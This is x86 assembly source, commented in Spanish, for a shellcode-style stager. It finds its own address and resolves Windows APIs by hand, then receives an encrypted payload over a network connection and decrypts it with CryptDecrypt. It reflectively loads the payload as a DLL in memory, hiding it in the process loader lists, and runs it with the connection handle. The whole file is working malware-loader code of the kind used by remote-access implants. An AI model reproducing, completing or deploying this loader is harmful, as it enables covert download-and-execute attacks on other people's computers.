	global main
	[BITS 32]
			
	%include "loader.inc"
	%include "kernel32.inc"
	%include "net.inc"
			
			
	section code USE32
	;quitamos la macro import de estas funciones
	%undef LoadLibraryA
	;//extern LoadLibraryA
	%undef GetProcAddress
	;//extern GetProcAddress
	;/////////////////////////////////////////////////////////////////////////////////////////////////
	;//Para llamar a las apis he creado un macro llamado ecall (Extern Call) que me protege de		//
	;//los cambios en los registros que hacen muchas apis.Tambien esta el macro ecall2 que es igual	//
	;//que el anterior, pero no las declara como externas											//
	;/////////////////////////////////////////////////////////////////////////////////////////////////
	
	
			
			
	nop
	nop
proc main,LoadLibrary_,GetProcAddress_,hConexion,hKey
	localdd kernel32
	;localdd msvcrt
	localdd VirtualProtect_
	localdd OldProtect
	localbuf FuncTable,sizeof(LoaderFunTable)
endl
			
	xor eax,eax
	inc eax
	pushad
			
	call GetDeltaOffset
	mov esi,eax
	;//**********************************
	;* ESI contiene el deltaOffset		*
	;***********************************//
	
	
	;//Consigo la direccion de kernel32
	push kernel32N
	add [esp],esi
	ecall2 %$LoadLibrary_
	mov dword %$kernel32,eax
			
	push VirtualProtectN
	add [esp],esi
	push dword %$kernel32
	ecall2 %$GetProcAddress_
	mov %$VirtualProtect_,eax
			
	;//Cambio la proteccion
	lea ebx,%$OldProtect
	push ebx
	push PAGE_EXECUTE_READWRITE
	push EOF-main;Calculo el tamaño de mi code
	push main
	add [esp],esi
	call eax;//VirtualProtect
	;//Empiezo a guardar las direcciones de las funciones
	mov ebx,VirtualProtect
	mov eax,%$VirtualProtect_
	mov [ebx+esi+1],eax
	
	
	;//Preparo la FuncTable para inicializarla
	lea ecx,%$FuncTable
	;//Coloco en su sitio estas funciones que son imprescindibles
	mov eax,%$LoadLibrary_
	mov ebx,LoadLibraryA
	mov [ebx+esi+1],eax
	lea eax,[ebx+esi+1]
	mov [ecx+LoaderFunTable.LoadLibraryA],eax
			
	mov eax,%$GetProcAddress_
	mov ebx,GetProcAddress
	mov [ebx+esi+1],eax
	lea eax,[ebx+esi+1]
	mov [ecx+LoaderFunTable.GetProcAddress],eax
	
	;//Punteros a las funciones de carga de modulos en memoria
	lea eax,[LoadLibraryFromMemoy+esi]
	mov [ecx+LoaderFunTable.GetProcAddress],eax
	lea eax,[FreeLibraryFromMemoy+esi]
	mov [ecx+LoaderFunTable.GetProcAddress],eax
			
			
	;//Cargo las funtionTables
	
	;//Kernel32
	push esi
	push kernel32FuncTable
	add [esp],esi
	call loadFuntionTable
	
	;//biblioteca de c
	push esi
	push msvcrtFuncTable
	add [esp],esi
	call loadFuntionTable
	
	;//socket
	push esi
	push ws2_32FuncTable
	add [esp],esi
	call loadFuntionTable
	
	;//Funciones de cifrado
	push esi
	push advapi32FuncTable
	add [esp],esi
	call loadFuntionTable
			
	;Ahora toca relocalizar el codigo estatico que pueda quedar
	;PUSH_RELOC_0
	mov eax,PUSH_RELOC_0
	add [eax+esi+1],esi
	;PUSH_RELOC_1
	mov eax,PUSH_RELOC_1
	add [eax+esi+1],esi
			
			
	;//Mando el OK para que el cliente sepa que estoy listo
	push dword %$hConexion
	call sendOK
	
	;//Recivo el playload
	push dword %$hConexion
	call readPlayload
	;//Devuelve una estructura Playload o zero
	test eax,eax
	jz .ExitError
	mov edx,eax		;//EDX = Playload
	
	;Desencripto
	push edx	;//Datos
	push dword %$hKey
	call decrypt
	
	;//Calculo el CheckSum
	push edx
	call calcCheckSum
	mov edx,[edx+Playload.checksum]	;//edx = CheckSum recivido
	cmp eax,edx					;//eax = CheckSum calculado
	jne .ExitError
	;//Si coincide sigo
	
	lea eax,[edx+Playload.data];// EAX = Direccion del modulo a cargar
	;//Cargo el plugin loader
	push PluginLoaderName
	add [esp],esi
	push eax
	call LoadLibraryFromMemoy
	test eax,eax
	jz .ExitError
	mov ebx, eax
	;//Aqui se devuelve la direccion base del modulo cargado
			
	;//Livero la estructura Playload
	
	push edx
	ecall2 free
			
	;//Se buscar aqui la funcion de entrada
	push PluginLoaderEntry
	add [esp],esi
	push eax
	ecall2 GetProcAddress
			
	;//Se ejecuta la funcion principal del programa
	push ecx	; ecx = %$FuncTable
	push dword %$hKey
	push dword %$hConexion
	ecall2 eax
	;int DLL_EXPORT WINAPI InitPluginLoader(long hConexion,long hKey,LoaderFunTable& lFunc);
			
	;Descargamos el modulo de la memoria
	push ebx
	call FreeLibraryFromMemoy
	
	.ExitError:
	;//Salimos del programa
	;push 0
	;call ExitProcess
			
	popad
	leave
	ret
endp
			
	int3
	int3
	int3
	int3
	int3
	int3
	int3
	int3
			
proc GetDeltaOffset
	localbuf relleno,4
endl
			.delta:
	fldz
	db 0xD9,0x74,0xE4,0xF4	;FSTENV SS:[ESP-0C]
	pop eax					;Aqui esta eip
	sub eax,.delta
endp
			
proc memcpy, PDestino,POrigen,size
endl
	pushad
			
	mov esi,%$POrigen
	mov edi,%$PDestino
	mov ecx,%$size
	rep movsb
			
	return %$PDestino
endp
proc lstrlenA,AsciiStr
endl
	pushad 
	xor ecx,ecx
	mov eax,ecx
	dec ecx
			
	mov edi,%$AsciiStr
	repne scasb
	inc ecx
	not ecx
			
	return ecx
endp
proc AscToUni, AsciiStr,BuffToCopy
endl
	pushad
			
	mov esi,%$AsciiStr
	mov edi,%$BuffToCopy
	xor eax,eax;Pomgo a cero
			
.nextChar:	;//Para convertir a unicode, ensancho los caracteres con un 0 de relleno para que quede asi: 0xXX 0x00 0xXX 0x00
			
	;movzx ax,byte [esi+ecx]
	;mov [edi+ecx*2],ax
	lodsb	;//mov al,[edi]; edi++
	stosw	;//mov [esi],ax; edi +=2;
	;inc ecx
	test eax,eax
	jnz .nextChar
			
	popad
endp

proc calcCheckSum,pPayload
endl
	pushad
	mov eax,%$pPayload
	
	lea  esi, [eax+Playload.data]				;//ESI = pBuff = &Checksum
    mov  ecx, [eax+Playload.sizeDecriptData]	;//ECX = SizePayload
    cdq                             ;//hash = 0
FNV1a:
    lodsb                           ;//al = str[i]; i++;
    xor  dl, al                     ;//>hash ^= str[i];
    imul edx, 0x1EF30EB             ;//>hash *= 0x1EF30EB;
    loop FNV1a                      ;//>(len--);(len < 0)?
    
    return edx
endp

proc decrypt,hKey,pPlayload
endl
	pushad
	
	cdq                            ;//EDX = 0
	
	mov eax,%$pPlayload
    push dword [eax+Playload.sizeEncripData] ;//Variable temporal para guardar el tamaño de los datos a leer

    push esp                       ;//v
    lea eax,[eax+Playload.checksum]    ;//Puntero al principio de los datos
    push eax
    push edx                       ;//v
    push edx                       ;//v
    push edx                       ;//v
    push dword %$hKey              ;//Clave para el descifrado
    ecall2 CryptDecrypt        ;//>CryptDecrypt(hKey, 0, False, 0, pBuff, &buffLen);
    pop ecx
	
	;return 0
	popad
endp

proc sendOK,hConexion
	localdb ok
endl
	pushad
	mov byte %$ok,0x01
	
	push 0
	push sizeof(byte)
	lea eax,%$ok
	push eax
	push dword %$hConexion
	ecall2 send
	
	popad
endp

proc loadFuntionTable,funcTable,offset
	localdd hModule
endl
	pushad
	
	mov ecx,%$funcTable
	xor eax,eax
	
	cmp dword [ecx],eax
	jz .error
	mov esi,%$offset
	
	;//cargo la libreria
	push dword [ecx]
	add [esp],esi
	ecall2 LoadLibraryA
	test eax,eax
	jz .error
	mov %$hModule,eax
	mov edx,eax
	
	.next:
	add ecx, 4
	cmp dword [ecx],0
	jz .error
	
	;//Cargo la funcion
	push dword [ecx]
	add [esp],esi
	push edx
	ecall2 GetProcAddress
	
	add ecx, 4
	cmp dword [ecx],0
	jz .error
	;//Guardo la direccion de la funcion
	mov ebx,[ecx]
	mov [ebx+1+esi],eax	
	
	jmp .next
	.error:
	
	popad
endp

;//Lee del socket especificado y devuelve en ppBuff un puntero al buffer y en exa el tamaño de los datos leidos
proc readPlayload,hConexion
	localdd szBuff
	localdd pPlayload
	localdd szReadData
endl
	pushad
	;//Inicializo la variable
	xor eax,eax
	;mov dword [ebx],eax
	mov dword %$szReadData,eax
	
	;//Leo el primer dword que indica el tamaño de los datos a leer
	push dword 0
	push sizeof(DWORD)
	lea eax,%$szBuff
	push eax
	push dword %$hConexion
	ecall2 recv
	lea ebx,%$szReadData
	add dword [ebx],eax
	cmp eax,-1
	je .error
	test eax,eax
	jz .error
	
	mov ebx,%$szBuff
	;//Añado el tamaño de el cketsum
	;add ebx,4
	test ebx,0xf
	;//Calculo el tamaño del paquete que siempre es multiplo de 16
	jz .noAling
	shr ebx,4
	inc ebx
	shl ebx,4	
	.noAling:
	
	push ebx
	add dword [esp],sizeof(Playload)-sizeof(DWORD)
	ecall2 malloc
	add esp,4;Quito el parametro del stack
	mov %$pPlayload,eax
	;//relleno los campos de Playload
	mov [eax+Playload.sizeEncripData],ebx
	mov ecx,%$szBuff
	mov [eax+Playload.sizeDecriptData],ecx
	
	
	;//Leo los datos disponibles de la red
	push dword MSG_WAITALL
	push dword ebx
	;//pongo la direccion de Playload.checksum para que rellene el checksum y los datos
	push dword eax
	add dword [esp],Playload.checksum;//copio a partir del checksum
	push dword %$hConexion
	ecall2 recv
	cmp eax,-1;//Compruevo los errores
	je .error
	test eax,eax
	jz .error	
	
	jmp .noError
	.error:
	;//Devuelvo 0 si hay error de error
	xor eax,eax
	jmp .end
	.noError:
	;//Si no hay error devuelvo pPlayload
	mov eax,%$pPlayload
	.end:
	
	return eax
endp


			
proc LoadLibraryFromMemoy, AddrBase, ModName
	LOCALDD PE
	LOCALDD SectionsHead
	LOCALDD ldr_module
	LOCALDD NewBase
	LOCALDD OldProtect
	LOCALDB RelocFlag
endl
	pushad
	
	push dword %$AddrBase
	call PEGetNT_HEADER
	mov %$PE,eax
	push eax
	push dword %$AddrBase
	call PEGetSectionHeader
	mov %$SectionsHead,eax
	mov ebx,%$PE
			
	;Reservo memoria para Cargar el ejecutable alli
	push dword 0x40     ;PAGE_EXECUTE_READWRITE
	push dword 0x2000   ;MEM_RESERVE
	push dword [ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.SizeOfImage]
	push dword [ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.ImageBase];Preferentemente en la direccion de la imagen base
	ecall2 VirtualAlloc
	mov %$NewBase,eax
	test eax,eax
	jz .error
	mov esi,%$AddrBase
	;Creamos un LDR_MODULE para luego añadir el modulo a la lista
	;push eax				
			
	push sizeof(LDR_MODULE)
	ecall2 malloc
	add esp,4
	mov %$ldr_module,eax
			
	mov ecx,[ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.SizeOfImage]
	mov edx,[ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint]
			
	;Rellenamos los campos
	;push eax
	ecall2 TlsAlloc;Pido un index para el TLS
			
	mov edi,%$NewBase
	add edx,edi
	;mov ebx,eax
	mov eax,%$ldr_module
	mov dword [eax+LDR_MODULE.BaseAddress],edi
	mov dword [eax+LDR_MODULE.SizeOfImage],ecx
	mov dword [eax+LDR_MODULE.EntryPoint],edx
	mov word [eax+LDR_MODULE.TlsIndex],ax;
	mov word [eax+LDR_MODULE.LoadCount],1
			
	push dword %$ModName
	ecall2 lstrlenA
	mov ecx,eax
	inc ecx
	shl ecx,1
			
	push ecx
	ecall2 malloc
	add esp,4
	mov ebx,eax
			
	;push ecx
	push ebx
	push  dword %$ModName
	call AscToUni
			
			
	;pop eax
	mov eax,%$ldr_module
			
			
	mov word [eax+LDR_MODULE.FullDllName+UNICODE_STRING.Length],cx
	mov word [eax+LDR_MODULE.FullDllName+UNICODE_STRING.MaximumLength],cx
	mov dword [eax+LDR_MODULE.FullDllName+UNICODE_STRING.Buffer],ebx
	mov word [eax+LDR_MODULE.BaseDllName+UNICODE_STRING.Length],cx
	mov word [eax+LDR_MODULE.BaseDllName+UNICODE_STRING.MaximumLength],cx
	mov dword [eax+LDR_MODULE.BaseDllName+UNICODE_STRING.Buffer],ebx
	mov dword [eax+LDR_MODULE.SectionHandle],-1
	mov ebx,%$PE
	mov ecx,[ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.CheckSum]
	mov dword [eax+LDR_MODULE.CheckSum],ecx
	mov ecx,[ebx+IMAGE_NT_HEADERS.FileHeader+IMAGE_FILE_HEADER.TimeDateStamp]
	mov dword [eax+LDR_MODULE.TimeDateStamp],0
	mov dword [eax+LDR_MODULE.Flags],LDR_WINE_INTERNAL | LDR_ENTRY_PROCESSED | LDR_LOAD_IN_PROGRESS
			
			
	mov eax,%$NewBase
	cmp [ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.ImageBase],eax
	jne .reloc
.RelocContinue:
	;mov edi,eax
			
	mov ecx, [ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.SizeOfHeaders]
			
	push dword 0x40     ;PAGE_EXECUTE_READWRITE
	push dword 0x1000   ;MEM_COMMIT
	push ecx
	push eax
	ecall2 VirtualAlloc
	test eax,eax
	jz .error
	;Copio la cabecera del modulo ejecutable
			
	push ecx
	push esi
	push eax
	call memcpy
	;add esi,ecx
	;add edi,ecx
	lea edx,%$OldProtect
	push edx
	push 0x02;PAGE_READONLY
	push ecx
	push eax
	ecall2 VirtualProtect
			
	xor ecx,ecx
	mov cx,[ebx+IMAGE_NT_HEADERS.FileHeader+IMAGE_FILE_HEADER.NumberOfSections]
			
	;Obtengo la primera cabecera de seccion
	push ebx
	push esi
	call PEGetSectionHeader
	mov edx,eax
	;Cargamos las secciones
			.SectLoad:
	dec ecx
	mov eax,[edx+IMAGE_SECTION_HEADER.VirtualAddress]
	add eax,%$NewBase
			
	mov ebx,[edx+IMAGE_SECTION_HEADER.PointerToRawData]
	add ebx,esi
	push dword 0x40     ;PAGE_EXECUTE_READWRITE
	push dword 0x1000   ;MEM_COMMIT
	push dword [edx+IMAGE_SECTION_HEADER.VirtualSize]
	push eax
	ecall2 VirtualAlloc
			
	push dword [edx+IMAGE_SECTION_HEADER.SizeOfRawData]
	push ebx
	push eax
	call memcpy
			
	;Leemos las caracteristicas de la seccion para asignarlas
	test dword [edx+IMAGE_SECTION_HEADER.Characteristics],IMAGE_SCN_MEM_EXECUTE
	jnz .SECTION_CODE
	test dword [edx+IMAGE_SECTION_HEADER.Characteristics],IMAGE_SCN_MEM_WRITE
	jnz .SECTION_DATA
	test dword [edx+IMAGE_SECTION_HEADER.Characteristics],IMAGE_SCN_MEM_READ
	jnz .SECTION_RDATA
	mov dword %$OldProtect,0x01;PAGE_NOACCESS
	jmp .SECTION_PROTECT_END
.SECTION_CODE:
	mov dword %$OldProtect,0x20;PAGE_EXECUTE_READ
	jmp .SECTION_PROTECT_END
.SECTION_DATA:
	mov dword %$OldProtect,0x04;PAGE_READWRITE
	jmp .SECTION_PROTECT_END
.SECTION_RDATA:
	mov dword %$OldProtect,0x02;PAGE_READONLY
.SECTION_PROTECT_END:
			
	lea ebx,%$OldProtect
	push ebx
	push dword [ebx]
	push dword [edx+IMAGE_SECTION_HEADER.VirtualSize]
	push eax
	ecall2 VirtualProtect   
	add edx,IMAGE_SECTION_HEADER_size  
	test ecx,ecx
	jnz .SectLoad
	;Secciones cargadas
	;Cojo la nueva direccion de PE
	push dword %$NewBase
	call PEGetNT_HEADER
	mov %$PE,eax
			
			
	;Añado a la lista el modulo
	push dword %$ldr_module
	call AddLdrModules
	mov ecx,%$ldr_module
	test byte %$RelocFlag,1
	jz .NoReloc
	or dword [ecx+LDR_MODULE.Flags],LDR_MODULE_REBASED
	;Si procede aqui  se Relocalizaran las Secciones
	push dword %$PE
	push dword %$NewBase
	call PEBaseReloc
.NoReloc:
	;Hay que cargar la IAT
	push dword %$PE
	push dword %$NewBase
	call PELoadIAT
			
			
	;//Aqui se empieza a ejecutar el modulo
	push 1
	push dword %$PE
	push dword %$ldr_module
	push dword %$NewBase
	call PEEntry
	;or dword [ecx+LDR_MODULE.Flags],LDR_PROCESS_ATTACHED
	and dword [ecx+LDR_MODULE.Flags], ~LDR_LOAD_IN_PROGRESS
			
	jmp .end
.reloc:
	test word [ebx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.DllCharacteristics],IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
	jz .error
	mov byte %$RelocFlag,1
	jmp .RelocContinue
.error:
	mov eax,-1
	jmp .end_error
.end:
	mov eax,%$NewBase
.end_error:
			
	return eax
endp
			
proc FreeLibraryFromMemoy, AddrBase
	localdd PE
endl
	pushad
	
	;Busco el modulo en la lista de modulos cargados
	push dword %$AddrBase
	call GetLdrModule
	test eax,eax;Si no esta, devuelve Zero
	jz .error
	mov ebx,eax
	
	push dword %$AddrBase
	call PEGetNT_HEADER
	mov dword %$PE,eax
	;//Notificamos que se va a producir la descarga del modulo
	push 0
	push eax
	push ebx
	push dword %$AddrBase
	call PEEntry
	
	;Eliminamos el nodo de la lista
	push ebx
	call DelLdrModule
	
	;//Livero la memoria reservada para el modulo
	push 0x8000				;MEM_RELEASE
	push 0					;[edx+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.SizeOfImage]
	push dword %$AddrBase
	ecall2 VirtualFree
	
	mov al,1
	jmp .NoError
	.error:
	xor eax,eax
	.NoError:
	
	return eax
endp
proc PEGetNT_HEADER,AddrBase
	push edx
	push edi
			
	mov edx,%$AddrBase
	cmp word [edx+IMAGE_DOS_HEADER.e_magic],`MZ`;Compruebo la firma de MZ
	jne .error_NoDOS_head
	mov eax,dword [edx+IMAGE_DOS_HEADER.e_lfanew];Obtengo el desplazamiento de la IMAGE_NT_HEADERS
	lea edi,[eax+edx];Obtengo la direccion de la IMAGE_NT_HEADERS
	cmp dword [edi+IMAGE_NT_HEADERS.Signature],0x00004550;PE\0\0;Compruebo la firma del PE
	jne .error_NoPE_head
	mov eax,edi;Si todo es correcto, pongo la direccion en eax
	jmp .end
.error_NoPE_head:
.error_NoDOS_head:
	xor eax,eax
.end:
			
	pop edi
	pop edx
endp
			
proc PEGetSectionHeader,AddrBase,PE_base
endl
	mov eax,%$PE_base
	movzx eax,word[eax+IMAGE_NT_HEADERS.FileHeader+IMAGE_FILE_HEADER.SizeOfOptionalHeader]
	add eax,%$PE_base
	add eax,IMAGE_NT_HEADERS.OptionalHeader
endp
proc PEGetDirectoryEntry,AddrBase,PE_base, Table,SizeTable_out
	push ebx
	mov eax,%$PE_base
	mov ebx,%$Table
	shl ebx,3
			
	mov eax,[eax+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.DataDirectory+IMAGE_DATA_DIRECTORY.VirtualAddress+ebx]
	test eax,eax
	jz .IsEmpy	
	add eax,%$AddrBase
	mov esi,%$SizeTable_out
	test esi,esi
	jz .NotSizeOut
	mov edx,[eax+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.DataDirectory+IMAGE_DATA_DIRECTORY.size+ebx]
	mov dword [esi],edx
.NotSizeOut:
.IsEmpy:
	pop ebx
endp
proc PEBaseReloc,AddrBase,PE_base
	localdd TableSize
	localdd Delta
endl
	lea eax,%$TableSize
	push eax
	push IMAGE_DIRECTORY_ENTRY_BASERELOC
	push dword %$PE_base
	push dword %$AddrBase
	call PEGetDirectoryEntry
	test eax,eax
	jz .NotFound
	mov esi,%$AddrBase
	mov eax,%$PE_base
	;//Obtengo el delta del nuevo modulo
	sub esi,[eax+IMAGE_NT_HEADERS.OptionalHeader+IMAGE_OPTIONAL_HEADER.ImageBase]
	mov %$Delta,esi
	;mov ecx,%$TableSize
.NextBR:
	;//Cargo el bloke de reubicacion
	mov edx,[eax+IMAGE_BASE_RELOCATION.BR_SizeOfBlock]
	mov ecx,edx
	mov ebx,[eax+IMAGE_BASE_RELOCATION.BR_VirtualAddress]
	add ebx,%$AddrBase
	;//Le añado el tamaño de IMAGE_BASE_RELOCATION para encontrar el array de 
	add eax,sizeof(IMAGE_BASE_RELOCATION)
	sub ecx,sizeof(IMAGE_BASE_RELOCATION)
.NextEntry:
	sub ecx,2
			
	mov di,[eax+ecx];//IMAGE_RELOCATION_DATA
	shr di,12;//IMAGE_RELOCATION_DATA.RelocType
	test di,di;//type == IMAGE_REL_BASED_ABSOLUTE
	jnz .NotAbsolute
	jmp .Contibue
.NotAbsolute:
	cmp di,IMAGE_REL_BASED_HIGH
	jnz .NotHigh
	movzx edi,word [eax+ecx]
	and di,0x0fff
	jmp .Contibue
	;//Relocaliza solo la parte alta
	shr esi,16
	add [edi+ebx+2],si
	mov esi,%$Delta
.NotHigh:
	cmp di,IMAGE_REL_BASED_LOW
	jnz .NotLow
	movzx edi,word [eax+ecx]
	and di,0x0fff
	jmp .Contibue
	;//Relocaliza solo la parte baja
	add [edi+ebx],si
.NotLow:
	cmp di,IMAGE_REL_BASED_HIGHLOW
	jnz .NotHighLow
	movzx edi,word [eax+ecx]
	and di,0x0fff
	jmp .Contibue
	;//Relocalizacion de 32b
	add [edi+ebx],esi
.NotHighLow:
.Contibue:
			
	;//add eax,2;//Añado el tamaño de IMAGE_RELOCATION_DATA que es de 2 bytes
	test ecx,ecx
	jnz .NextEntry
	add eax,edx
	sub eax,sizeof(IMAGE_BASE_RELOCATION)
			
	sub %$TableSize,edx
	jnz .NextBR
			.NotFound:
endp
proc PELoadTls,AddrBase,PE_base,Load_Notify;Valor boleano que indica si se notifica la carga o la descarga
	localdd TlsDataPlantillaAddr
	localdd TlsDataPlantillaAddrSize
			
	localdd Index
endl
	pushad
	push 0
	push IMAGE_DIRECTORY_ENTRY_TLS
	push dword %$PE_base
	push dword %$AddrBase
	call PEGetDirectoryEntry
	test eax,eax
	jz .NotFound
			
	mov ebx,eax
			
	;//Index para el tls
	ecall2 TlsAlloc
	mov %$Index, eax
	mov edx,[ebx+TLS_DIRECTORY.AddressOfIndex];//Cojo la direccion de la variable que contendra el index
	mov [edx],eax;//Le asigno un index
			
	mov edx,[ebx+TLS_DIRECTORY.RawDataStartVA]
	mov %$TlsDataPlantillaAddr,edx
	mov ecx,[ebx+TLS_DIRECTORY.RawDataEndVA];//Calculo el tamaño de los datos
	sub ecx,edx
	mov %$TlsDataPlantillaAddrSize,ecx
			
	push ecx
	ecall2 malloc;//Pido memoria para guardarlo
	add esp,4
	mov esi,eax;//Buffer donde se copiara
			
	push ecx
	push edx
	push esi
	call memcpy;//Copio la plantilla al buffert
			
	push esi
	push dword %$Index
	ecall2 TlsSetValue;//Guardo el buffert en el tls
			
	;//Llamo a los TlsCallback
			
	mov edx,[ebx+TLS_DIRECTORY.AddressOfCallbacks]
			
			.tlsNext:
	cmp dword [edx],0;//Bucle que recorrera el array hasta encontrarse con el puntero que vale 0
	je .tlsEnd
			
	push 0
	push dword %$Load_Notify
	push dword %$AddrBase
	ecall2 [edx]
			
	add edx,4
	jmp .tlsNext
.tlsEnd:
			
.NotFound:
	popad
endp
			
proc PELoadIAT,AddrBase,PE_base
	localdd IAT
	localdd OldProtect
endl
	pushad
	push 0
	push IMAGE_DIRECTORY_ENTRY_IMPORT
	push dword %$PE_base
	push dword %$AddrBase
	call PEGetDirectoryEntry
	mov dword %$IAT,eax
	mov ebx,eax
			
.nextImportModule:
	mov eax,[ebx+IMAGE_IMPORT_DESCRIPTOR.Name1]
	test eax,eax
	jz .endLoad
	add eax,dword %$AddrBase
	;//Cargo el modulo que sale en la Import
	push eax
	ecall2 LoadLibraryA
	mov edx,eax
	mov esi,[ebx+IMAGE_IMPORT_DESCRIPTOR.FirstThunk]
	add esi,dword %$AddrBase
			
	lea eax,%$OldProtect
	push eax
	push 4
	push 0x1000
	mov eax,[ebx+IMAGE_IMPORT_DESCRIPTOR.FirstThunk]
	add eax,%$AddrBase
	push eax
	ecall2 VirtualProtect
	;//Cambio la proteccion para poder escrivir en el FirstThunk las direcciones de las funcciones
			
	xor ecx,ecx
.nextImportFunc:
	test dword[esi+IMAGE_THUNK_DATA.AddressOfData+ecx],-1
	jz .EndImportFunc
			
	mov eax,[esi+IMAGE_THUNK_DATA.AddressOfData+ecx]
	add eax,%$AddrBase
	lea eax,[eax+IMAGE_IMPORT_BY_NAME.Name1]
	push eax
	push edx
	ecall2 GetProcAddress
	;//Busco la direccion de la funcion importada y la guardo en el THUNK_DATA
	mov [esi+IMAGE_THUNK_DATA.AddressOfData+ecx],eax
			
	add ecx,4
	jmp .nextImportFunc
.EndImportFunc:
	lea eax,%$OldProtect
	push eax
	push dword [eax]
	push 0x1000
	mov eax,[ebx+IMAGE_IMPORT_DESCRIPTOR.FirstThunk]
	add eax,%$AddrBase
	push eax
	ecall2 VirtualProtect
	;//Restauro la proteccion
	lea ebx,[ebx+IMAGE_IMPORT_DESCRIPTOR_size]
	jmp .nextImportModule
.endLoad:
	popad
endp
			
proc PEEntry, base, LDR_Entry,PE_base,ATTACHED_Notiffy;Si vale 1, se realiza la carga y si vale 0 la descarga
endl;Macro para las var locales
	pushad
	
	and dword %$ATTACHED_Notiffy,1
	;//Cargo y ejecuto los TlsCallback
	push dword %$ATTACHED_Notiffy
	push dword %$PE_base
	push dword %$base
	call PELoadTls
			
	mov ebx,%$LDR_Entry
			
	mov ebx,%$LDR_Entry
	mov eax,[ebx+LDR_MODULE.EntryPoint]
	test eax,eax
	jz .NoMain
	;Segun proceda pongo o quito la el flag de LDR_PROCESS_ATTACHED
	test dword %$ATTACHED_Notiffy,1
	jz .detach
	or dword [ebx+LDR_MODULE.Flags],LDR_PROCESS_ATTACHED
	jmp .attached
	.detach:
	and dword [ebx+LDR_MODULE.Flags],~LDR_PROCESS_ATTACHED
	.attached:
			
	push dword 0
	push dword %$ATTACHED_Notiffy
	push dword %$base
	call eax	;//Ejecuto el main si no hay un dll main
	jmp PEEntry_end
.NoMain:
			
PUSH_RELOC_1:
	;//Busco el dll main para llamarlo
	push dllmain@
	push dword %$base
	ecall2 GetProcAddress
	and dword [ebx+LDR_MODULE.Flags],~LDR_LOAD_IN_PROGRESS;//Quito el flag de carga en proceso
	test eax,eax
	jz PEEntry_end
	push dword 0
	push dword %$ATTACHED_Notiffy
	push dword %$base
	call eax	;//Ejecuto el dll main si lo hay
	;Segun proceda pongo o quito la el flag de LDR_PROCESS_ATTACHED
	test dword %$ATTACHED_Notiffy,1
	jz .detach
	or dword [ebx+LDR_MODULE.Flags],LDR_PROCESS_ATTACHED
	jmp .attached
	.detach:
	and dword [ebx+LDR_MODULE.Flags],~LDR_PROCESS_ATTACHED
	.attached:
PEEntry_end:
	popad
endp
			
proc AddLdrModules,module;PLDR_MODULE
	;//localdd ldr
endl
	pushad
	mov esi,%$module
	mov eax,[fs:0x30];Saco la direccion del PEB
	mov eax,[eax+0x0c];Saco el puntero a PEB_LDR_DATA
	;//mov %$ldr,eax
	lea eax,[eax+PEB_LDR_DATA.InLoadOrderModuleList];Saco la direccion del ultimo nodo cargado
	;mov dword [esi+LDR_MODULE.Flags],0
	;or dword [esi+LDR_MODULE.Flags],LDR_LOAD_IN_PROGRESS
			
	;añadimos el modulo a InLoadOrderModuleList, lo ponemos el ultimo, porque a sido el ultimo en cargar
	mov ebx,[eax+LIST_ENTRY.Blink]
	mov [eax+LIST_ENTRY.Blink],esi
	mov [ebx+LIST_ENTRY.Flink],esi
	mov [esi+LIST_ENTRY.Blink],ebx
	mov [esi+LIST_ENTRY.Flink],eax
			
	lea edi,[esi+LDR_MODULE.InInitializationOrderModuleList]
	lea edx,[eax+LDR_MODULE.InInitializationOrderModuleList]
			
	mov ebx,[edx+LIST_ENTRY.Blink]
	mov [edx+LIST_ENTRY.Blink],edi
	mov [ebx+LIST_ENTRY.Flink],edi
	mov [edi+LIST_ENTRY.Blink],ebx
	mov [edi+LIST_ENTRY.Flink],edx
			
	mov ecx, [esi+LDR_MODULE.BaseAddress]
	lea esi,[esi+LDR_MODULE.InMemoryOrderModuleList]
	lea edi,[eax+LDR_MODULE.InMemoryOrderModuleList]
	mov ebx,[edi+LIST_ENTRY.Blink]
	;//Aqui voy buscando el lugar apropiado en InMemoryOrderModuleList para insertar
			.SearchMemoryOrder:
	cmp [ebx+LDR_MODULE.BaseAddress-LDR_MODULE.InMemoryOrderModuleList],ecx
	ja .NoFind
	mov ecx,[ebx+LIST_ENTRY.Flink]
	mov [ebx+LIST_ENTRY.Flink],esi
	mov [ecx+LIST_ENTRY.Blink],esi
	mov [esi+LIST_ENTRY.Flink],ecx
	mov [esi+LIST_ENTRY.Blink],ebx
			
	jmp .end
			.NoFind:
			
	mov ebx,[ebx+LIST_ENTRY.Blink]
	cmp ebx,eax
	je .end
	jmp .SearchMemoryOrder
			.end:
			
PUSH_RELOC_0:
	;Hacemos una llamada a GetProcAddress para que se haga a esa nueva lista de modulos
	;Lo ago por haver visto que la primera llamada a GPA despues de añadir una entrada a veces falla
	push nulo
	push dword [esi+LDR_MODULE.BaseAddress-LDR_MODULE.InMemoryOrderModuleList]
	ecall2 GetProcAddress
			
			
	popad
endp
proc GetLdrModule,module_base
endl
	pushad
	mov esi,%$module_base
	mov eax,[fs:0x30];Saco la direccion del PEB
	mov eax,[eax+0x0c];Saco el puntero a PEB_LDR_DATA
	
	lea ebx,[eax+PEB_LDR_DATA.InLoadOrderModuleList]
	mov ecx,ebx
	
	.NexNode:
	cmp esi,[ebx+LDR_MODULE.BaseAddress];Comprovamos si coincide la direccion base con la del modulo que buscamos
	je .ModuleFount
	;Pasamos al siguiente modulo
	mov ebx,[ebx+LDR_MODULE.InLoadOrderModuleList+LIST_ENTRY.Blink]
	;Comprovamos que no pasamos ya por este nodo
	cmp ebx,ecx
	jnz .NexNode
	;//Si se recorren todos los nodos de la lista y no se encuentra, se debuelve ZERO
	xor ebx,ebx
.ModuleFount:
			
	return ebx
endp
